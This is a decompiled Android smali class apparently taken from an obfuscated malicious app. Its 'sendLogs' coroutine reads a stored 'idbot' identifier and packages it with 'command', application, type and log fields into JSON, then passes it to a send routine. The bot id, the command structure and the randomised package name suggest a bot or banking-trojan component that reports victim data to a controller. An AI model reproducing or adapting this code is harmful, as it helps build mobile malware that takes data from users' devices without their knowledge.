.class public final Lc0/b$g;
.super Ln0/h;
.source ""

# interfaces
.implements Lr0/c;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lc0/b;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x19
    name = null
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Ln0/h;",
        "Lr0/c<",
        "Lz0/x;",
        "Ll0/d<",
        "-",
        "Lj0/g;",
        ">;",
        "Ljava/lang/Object;",
        ">;"
    }
.end annotation

.annotation runtime Ln0/e;
    c = "com.cisojemopatude.yazi.buvixudetu.rolu$sendLogs$1"
    f = "rolu.kt"
    l = {
        0xa3
    }
    m = "invokeSuspend"
.end annotation


# instance fields
.field public g:I

.field public final synthetic h:Ljava/lang/String;

.field public final synthetic i:Landroid/content/Context;

.field public final synthetic j:Ljava/lang/String;

.field public final synthetic k:Ljava/lang/String;


# direct methods
.method public constructor <init>(Ljava/lang/String;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ll0/d;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            "Landroid/content/Context;",
            "Ljava/lang/String;",
            "Ljava/lang/String;",
            "Ll0/d<",
            "-",
            "Lc0/b$g;",
            ">;)V"
        }
    .end annotation

    iput-object p1, p0, Lc0/b$g;->h:Ljava/lang/String;

    iput-object p2, p0, Lc0/b$g;->i:Landroid/content/Context;

    iput-object p3, p0, Lc0/b$g;->j:Ljava/lang/String;

    iput-object p4, p0, Lc0/b$g;->k:Ljava/lang/String;

    const/4 p1, 0x2

    invoke-direct {p0, p1, p5}, Ln0/h;-><init>(ILl0/d;)V

    return-void
.end method


# virtual methods
.method public final a(Ljava/lang/Object;Ll0/d;)Ll0/d;
    .locals 6
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/Object;",
            "Ll0/d<",
            "*>;)",
            "Ll0/d<",
            "Lj0/g;",
            ">;"
        }
    .end annotation

    new-instance p1, Lc0/b$g;

    iget-object v1, p0, Lc0/b$g;->h:Ljava/lang/String;

    iget-object v2, p0, Lc0/b$g;->i:Landroid/content/Context;

    iget-object v3, p0, Lc0/b$g;->j:Ljava/lang/String;

    iget-object v4, p0, Lc0/b$g;->k:Ljava/lang/String;

    move-object v0, p1

    move-object v5, p2

    invoke-direct/range {v0 .. v5}, Lc0/b$g;-><init>(Ljava/lang/String;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ll0/d;)V

    return-object p1
.end method

.method public b(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    .locals 6

    check-cast p1, Lz0/x;

    move-object v5, p2

    check-cast v5, Ll0/d;

    .line 1
    new-instance p1, Lc0/b$g;

    iget-object v1, p0, Lc0/b$g;->h:Ljava/lang/String;

    iget-object v2, p0, Lc0/b$g;->i:Landroid/content/Context;

    iget-object v3, p0, Lc0/b$g;->j:Ljava/lang/String;

    iget-object v4, p0, Lc0/b$g;->k:Ljava/lang/String;

    move-object v0, p1

    invoke-direct/range {v0 .. v5}, Lc0/b$g;-><init>(Ljava/lang/String;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ll0/d;)V

    .line 2
    sget-object p2, Lj0/g;->a:Lj0/g;

    invoke-virtual {p1, p2}, Lc0/b$g;->f(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object p1

    return-object p1
.end method

.method public final f(Ljava/lang/Object;)Ljava/lang/Object;
    .locals 5

    sget-object v0, Lm0/a;->c:Lm0/a;

    iget v1, p0, Lc0/b$g;->g:I

    const/4 v2, 0x1

    if-eqz v1, :cond_1

    if-ne v1, v2, :cond_0

    :try_start_0
    invoke-static {p1}, Lb/a;->C(Ljava/lang/Object;)V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_2

    :catch_0
    move-exception p1

    goto/16 :goto_1

    :cond_0
    new-instance p1, Ljava/lang/IllegalStateException;

    const-string v0, "call to \'resume\' before \'invoke\' with coroutine"

    invoke-direct {p1, v0}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw p1

    :cond_1
    invoke-static {p1}, Lb/a;->C(Ljava/lang/Object;)V

    iget-object p1, p0, Lc0/b$g;->h:Ljava/lang/String;

    invoke-static {p1}, Ly0/f;->M(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_2

    sget-object p1, Lj0/g;->a:Lj0/g;

    return-object p1

    :cond_2
    new-instance p1, Lorg/json/JSONObject;

    invoke-direct {p1}, Lorg/json/JSONObject;-><init>()V

    :try_start_1
    iget-object v1, p0, Lc0/b$g;->i:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v3, "context.applicationContext"

    invoke-static {v1, v3}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 1
    sput-object v1, Ls0/c;->e:Landroid/content/Context;

    sget-object v3, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v3, :cond_3

    const-string v3, "settings"

    const/4 v4, 0x0

    invoke-virtual {v1, v3, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    sput-object v1, Ls0/c;->d:Landroid/content/SharedPreferences;

    .line 2
    :cond_3
    sget-object v1, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v1}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v3, "idbot"

    const-string v4, ""

    invoke-interface {v1, v3, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-nez v1, :cond_4

    goto :goto_0

    :cond_4
    move-object v4, v1

    .line 3
    :goto_0
    const-string v1, "command"

    const-string v3, "logs"

    invoke-virtual {p1, v1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "id"

    invoke-virtual {p1, v1, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "application"

    iget-object v3, p0, Lc0/b$g;->j:Ljava/lang/String;

    invoke-virtual {p1, v1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "type"

    iget-object v3, p0, Lc0/b$g;->k:Ljava/lang/String;

    invoke-virtual {p1, v1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "logs"

    iget-object v3, p0, Lc0/b$g;->h:Ljava/lang/String;

    invoke-virtual {p1, v1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "SEND "

    iget-object v3, p0, Lc0/b$g;->k:Ljava/lang/String;

    invoke-static {v1, v3}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    .line 4
    sget-object v1, Lb0/b;->a:Lb0/b;

    .line 5
    sget-object v1, Lc0/b;->a:Lc0/b;

    invoke-virtual {p1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p1

    iput v2, p0, Lc0/b$g;->g:I

    const/4 v2, 0x0

    .line 6
    invoke-virtual {v1, p1, v2, p0}, Lc0/b;->e(Ljava/lang/String;Ljava/lang/String;Ll0/d;)Ljava/lang/Object;

    move-result-object p1
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_0

    if-ne p1, v0, :cond_5

    return-object v0

    .line 7
    :goto_1
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const-string v1, "|  "

    invoke-static {v1}, Landroidx/activity/result/a;->b(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p1}, Lorg/json/JSONException;->getLocalizedMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string p1, "  | sendLogs  "

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v1, "sendLogs_error"

    invoke-virtual {v0, v1, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    iget-object p1, p0, Lc0/b$g;->i:Landroid/content/Context;

    const-string v1, "LogEvents"

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v1, v0}, Ls0/c;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_5
    :goto_2
    sget-object p1, Lj0/g;->a:Lj0/g;

    return-object p1
.end method
